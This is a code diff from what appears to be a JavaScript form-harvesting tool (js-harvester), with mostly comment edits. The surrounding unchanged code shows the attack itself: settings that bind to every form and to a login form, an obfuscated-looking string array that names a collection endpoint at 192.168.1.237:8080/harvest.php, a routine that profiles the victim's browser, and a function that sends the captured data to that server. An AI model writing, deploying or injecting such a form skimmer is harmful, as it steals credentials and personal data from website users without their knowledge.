@@ -3,13 +3,13 @@
 *  https://github.com/toneillcodes/js-harvester
 *
 */
-var dynamicTrackers = true;			//	(boolean, true/false) 
-var bindAllFormsSwitch = true;		//	(boolean, true/false)
+var dynamicTrackers = true;			//	(true/false) 
+var bindAllFormsSwitch = true;		//	(true/false)
 var formName = "loginform2";
-var enableEncoding = true;			//	(boolean, true/false)
-var usePost = false;				//	(boolean, true/false)
-var trackClients = true;			//	(boolean, true/false)
-var allowSubmission = false;		//	(boolean, true/false)
+var enableEncoding = true;			//	(true/false)
+var usePost = false;				//	(true/false)
+var trackClients = true;			//	(true/false)
+var allowSubmission = false;		//	(true/false)
 var _0x3745 = ["http","://","192.168.1.237:8080","/harvest.php","Content-type","application/x-www-form-urlencoded","GET","POST","HEAD","PUT","DELETE","OPTIONS","PATCH"];
 
 $(document).ready(function() {
@@ -174,6 +174,7 @@ function grabAll(form) {
 	}
 }
 
+/* collect some interesting client data from the user */
 function profileClient() {
 	let appCodeName = "";
 	let appName = "";
@@ -212,11 +213,12 @@ function profileClient() {
 	return clientData;
 }
 
+/* serialize data */
 function serializeData(inputData) {
 	return "stubdata";
 }
 
-/* send the collected data to our server */
+/* send the collected data to our server using XHR */
 function sendPayload(payload) {
     //console.log("DEBUG: usePost = " + usePost);
     var xhttp = new XMLHttpRequest();
